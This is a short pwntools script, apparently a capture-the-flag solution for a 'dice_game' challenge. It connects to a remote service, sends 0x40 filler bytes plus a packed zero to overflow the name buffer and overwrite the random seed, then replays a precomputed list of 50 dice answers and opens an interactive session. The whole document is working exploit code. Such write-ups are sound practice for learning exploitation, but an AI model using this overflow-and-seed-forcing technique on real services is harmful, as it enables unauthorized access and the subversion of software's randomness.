from pwn import *
 
g_local=False
context.log_level='debug'
 
if g_local:
	sh = process('./dice_game')#env={'LD_PRELOAD':'./libc.so.6'}
	#gdb.attach(sh)
else:
	sh = remote("111.198.29.45",32379)
 
ans = [2,5,4,2,6,2,5,1,4,2,3,2,3,2,6,5,1,1,5,5,6,3,4,4,3,3,3,2,2,2,6,1,1,1,6,4,2,5,2,5,4,4,4,6,3,2,3,3,6,1]
 
sh.recvuntil(" let me know your name: ")
sh.send("A" * 0x40 + p64(0))
 
for x in ans:
	sh.recvuntil("Give me the point(1~6): ")
	sh.send(str(x) + "\n")
 
sh.interactive()